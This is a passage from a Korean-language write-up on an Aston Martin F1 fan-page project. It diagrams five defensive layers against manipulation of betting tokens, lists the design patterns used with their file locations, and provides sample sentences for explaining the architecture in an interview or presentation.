│  js/constants.js                                                 │
│                                                                  │
│  const TOKEN_CONFIG = { MAX_DAILY: 100, ATTENDANCE_BASE: 10 };   │
│  Object.freeze(TOKEN_CONFIG);  ← 개발자 도구에서 수정 불가         │
│                                                                  │
│  ⚠️ 하지만 이건 "자물쇠 없는 문"                                    │
│     해커가 코드 자체를 수정하면 뚫림 → 서버 검증 필수!              │
└──────────────────────────────────────────────────────────────────┘
                              │
                              ▼
【2층 방어: 서버 시간 기준 검증】
┌──────────────────────────────────────────────────────────────────┐
│  server.js: 베팅 API                                             │
│                                                                  │
│  // 클라이언트 시계 조작해도 서버 시간으로 마감 체크                  │
│  const serverNow = Date.now();                                   │
│  if (serverNow >= race.deadline) {                               │
│      return res.status(400).json({ error: '베팅 마감됨' });       │
│  }                                                               │
└──────────────────────────────────────────────────────────────────┘
                              │
                              ▼
【3층 방어: Firestore Security Rules】
┌──────────────────────────────────────────────────────────────────┐
│  firestore.rules: users 컬렉션                                   │
│                                                                  │
│  // 토큰 증가 차단 (차감만 허용)                                    │
│  allow update: if                                                │
│      request.resource.data.tokens < resource.data.tokens  // ✓ 차감│
│      && request.resource.data.tokens >= 0                 // ✓ 음수 방지│
│      && request.resource.data.totalEarned == resource.data.totalEarned;│
│      // ↑ totalEarned 변경 금지                                   │
│                                                                  │
│  // 토큰 지급은 Admin SDK(서버)만 가능                              │
│  // 클라이언트에서 "나 토큰 줘!" 절대 불가                          │
└──────────────────────────────────────────────────────────────────┘
                              │
                              ▼
【4층 방어: 서버 트랜잭션】
┌──────────────────────────────────────────────────────────────────┐
│  server.js: 베팅 처리 (Firestore Transaction)                     │
│                                                                  │
│  await db.runTransaction(async (transaction) => {                │
│      // 1. 현재 잔액 조회                                         │
│      const userDoc = await transaction.get(userRef);             │
│      const currentTokens = userDoc.data().tokens;                │
│                                                                  │
│      // 2. 잔액 검증 (Race Condition 방지)                        │
│      if (currentTokens < betAmount) {                            │
│          throw new Error('잔액 부족');                            │
│      }                                                           │
│                                                                  │
│      // 3. 원자적으로 차감 + 베팅 생성                             │
│      transaction.update(userRef, {                               │
│          tokens: currentTokens - betAmount                       │
│      });                                                         │
│      transaction.set(betRef, { ... });                           │
│  });                                                             │
│                                                                  │
│  // 트랜잭션 = "모두 성공하거나, 모두 실패"                         │
│  // 중간에 다른 요청이 끼어들어도 데이터 정합성 보장                  │
└──────────────────────────────────────────────────────────────────┘
                              │
                              ▼
【5층 방어: 감사 로그 (Audit Trail)】
┌──────────────────────────────────────────────────────────────────┐
│  tokenHistory 컬렉션 (수정 불가)                                   │
│                                                                  │
│  {                                                               │
│      userId: "abc123",                                           │
│      type: "bet",                                                │
│      amount: -100,           ← 지출                               │
│      timestamp: 서버시간,                                         │
│      raceId: "2026_bahrain"                                      │
│  }                                                               │
│                                                                  │
│  ⚠️ 클라이언트 생성 금지 (Admin SDK만 가능)                        │
│  → 나중에 "이상한 거래" 추적 가능                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 4. 선생님께 설명할 때 쓸 수 있는 요약본

| 패턴 이름 | 내 코드에서 쓰인 위치 | 한 줄 설명 |
|----------|---------------------|----------|
| **IIFE** | `attendance.js:5`, `errorHandler.js`, `script.js` | 전역 변수 충돌 방지를 위한 즉시 실행 함수 |
| **싱글톤** | `errorHandler.js:560` | 앱 전체에서 하나만 존재하는 에러 처리 객체 |
| **옵저버** | `auth.js:129`, `headToHeadBet.js:250` | 상태 변화를 구독하고 자동으로 알림받는 패턴 |
| **캐싱** | `utils.js:9-92`, `f1api.js:19-74` | API 응답을 임시 저장해 중복 요청 방지 |
| **쓰로틀링** | `script.js:150-181` | 이벤트 발생 빈도를 제한 (1초에 한 번만) |
| **이벤트 위임** | `paddock.js:176-222` | 부모 요소에 이벤트를 달아 자식들 처리 |
| **에러 분류** | `errorHandler.js:45-117` | 에러 종류별로 다른 UI 표시 |
| **타임아웃** | `headToHeadBet.js:50-68` | 응답 지연 시 요청 강제 취소 |
| **지수 백오프** | `errorHandler.js:189-239` | 재시도 간격을 점점 늘려 서버 부담 감소 |
| **XSS 방지** | `utils.js:131-136` | 악성 스크립트 무력화 |
| **서버 시간 동기화** | `podiumBet.js:139-166` | 클라이언트 시계 조작 방지 |
| **상수 동결** | `constants.js:185-199` | 중요 설정값 수정 차단 |
| **DOM 캐싱** | `attendance.js:11-28` | 자주 쓰는 요소를 변수에 저장 |
| **DocumentFragment** | `paddock.js:158-165` | DOM 조작을 모아서 한 번에 반영 |
| **메모리 누수 방지** | `auth.js:239-242` | 페이지 떠날 때 인터벌/구독 정리 |
| **트랜잭션** | `server.js` (베팅 API) | 여러 DB 작업을 원자적으로 처리 |

---

## 5. 면접/발표용 핵심 문장

**아키텍처 설명할 때:**
> "프론트엔드는 Vanilla JS로 IIFE 패턴을 사용해 모듈화했고, Firebase Firestore의 실시간 구독(onSnapshot)으로 옵저버 패턴을 구현했습니다. 백엔드는 Node.js Express 서버로, 토큰 조작 방지를 위해 Firestore Transaction과 Security Rules를 조합한 다층 방어 구조를 적용했습니다."

**보안 설명할 때:**
> "코인 조작을 방지하기 위해 5단계 방어를 구현했습니다. 1) 클라이언트 상수 동결, 2) 서버 시간 기준 마감 검증, 3) Firestore Rules로 토큰 증가 차단, 4) 서버 트랜잭션으로 Race Condition 방지, 5) 감사 로그로 이상 거래 추적이 가능합니다."

**성능 최적화 설명할 때:**
> "API 캐싱으로 중복 요청을 제거하고, DocumentFragment로 DOM 리플로우를 최소화했습니다. 또한 Page Visibility API를 활용해 탭이 백그라운드일 때 타이머를 중지해 배터리를 절약합니다."

---

*분석일: 2026-02-05*
*분석 대상: Aston Martin F1 Fan Page 프로젝트*
